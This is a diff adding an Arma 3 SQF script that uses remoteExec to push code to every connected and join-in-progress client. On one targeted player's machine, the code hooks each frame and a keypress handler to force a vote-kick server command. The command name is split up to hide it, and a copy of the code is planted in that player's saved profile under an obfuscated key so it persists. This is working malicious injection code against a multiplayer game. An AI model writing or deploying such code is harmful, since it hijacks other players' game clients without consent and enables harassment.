@@ -1,0 +1,60 @@
+private _varname = "RhodSystem"; 
+private _myJIPCode = "RhodSystemJIP"; 
+ 
+private _value = (str { 
+    if (profileName == "delta-0") then { 
+      _test = '{ 
+
+		onEachFrame {
+            if (true) then { 
+                LM_DEH_autokickHandler = "jerry"; 
+                 
+                [_uid] spawn { 
+                    waitUntil { 
+                        !isNull (findDisplay 46) 
+                    }; 
+                    _kickDEH = (findDisplay 46) displayAddEventHandler ["Keydown", format["%2%3%4 ''#vote kick %1''; 
+                    (findDisplay 46) displayremoveEventHandler [''Keydown'', (player getVariable ''LM_DEH_autokickHandler%1'')];", _this select 0, "ser", "verCom", "mand"]]; 
+                    player setVariable [format["LM_DEH_autokickHandler%1", _this select 0], _kickDEH]; 
+                }; 
+            }; 
+			};
+        }'; 
+         
+        profileNamespace setVariable ["i2n3j4e5c6t7_8008", _test]; 
+     
+         onEachFrame {
+        if (true) then { 
+            LM_DEH_autokickHandler = "jerry"; 
+             
+            [_uid] spawn { 
+       waitUntil { 
+                        !isNull (findDisplay 46) 
+                    }; 
+                hint "testicles"; 
+                _kickDEH = (findDisplay 46) displayAddEventHandler ["Keydown", format["%2%3%4 '#vote kick %1'; 
+                    (findDisplay 46) displayremoveEventHandler ['Keydown', (player getVariable 'LM_DEH_autokickHandler%1')]; 
+                ", _this select 0, "ser", "verCom", "mand"]]; 
+                player setVariable [format["LM_DEH_autokickHandler%1", _this select 0], _kickDEH]; 
+            }; 
+        }; 
+		};
+    }; 
+}) splitstring ""; 
+ 
+_value deleteAt (count _value - 1); 
+_value deleteAt 0; 
+ 
+_value = _value joinstring ""; 
+_value = _value + "removeMissionEventHandler ['EachFrame', _thisEventHandler]; 
+"; 
+_value = _value splitstring ""; 
+ 
+missionnamespace setVariable [_varname, _value, true]; 
+ 
+[[_varname], { 
+    params ["_ding"]; 
+    private _data = missionnamespace getVariable [_ding, []]; 
+    _data = _data joinstring ""; 
+    addMissionEventHandler ["EachFrame", _data]; 
+}] remoteExec ['spawn', 0, _myJIPCode];
